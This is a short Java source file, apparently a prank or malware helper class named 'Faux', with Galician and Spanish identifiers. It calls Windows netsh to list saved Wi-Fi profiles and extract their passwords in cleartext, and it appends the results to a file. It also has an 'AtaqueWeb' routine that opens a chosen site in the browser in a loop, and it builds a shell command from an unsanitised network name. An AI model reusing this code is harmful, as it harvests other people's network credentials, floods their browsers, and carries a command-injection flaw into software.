import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class Faux {

	public static String ObterWifi() {
		String devolver = "";
		try {
			Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
			BufferedReader bf = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String aux;
			while ((aux = bf.readLine()) != null) {
				if (aux.contains("Perfil de todos los usuarios")) {
					devolver = devolver + "\r\n\t\t" + aux.substring(aux.indexOf(":") + 1);
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return devolver;
	}

	public static String Obtercontrasinal(String nombre) {
		String devolver = "";
		try {
			Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles name=" + nombre + " key=clear");
			BufferedReader bf = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String aux;
			boolean viable = true;
			while ((aux = bf.readLine()) != null) {
				if (aux.contains("Clave de seguridad                         : Ausente")) {
					viable = false;
				}
				if (aux.contains("Contenido de la clave") && viable) {
					devolver = " " + aux.substring(aux.indexOf(":") + 1) + "\n";
					return devolver;
				}
			}
			return " Contrasinal da rede Wi-Fi " + nombre + " esta ausente";
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return devolver;
	}

	public static void AtaqueWeb(String web, int bucle_infernal) {
		String URL = "https://" + web + "/";
		try {
			for (int i = 0; i < bucle_infernal; i++) {
				java.awt.Desktop.getDesktop().browse(java.net.URI.create(URL));
			}
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}

	public static void escribirfichero(String ficheroPath, String escribir) {
		FileWriter bw = null;
		PrintWriter pw = null;
		try {
			bw = new FileWriter(ficheroPath, true);
			pw = new PrintWriter(bw);
			pw.println("Resposta-->   " + escribir);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (pw != null)
					pw.close();
				if (bw != null)
					bw.close();
			} catch (Exception navida) {
				navida.printStackTrace();
			}
		}
	}
}
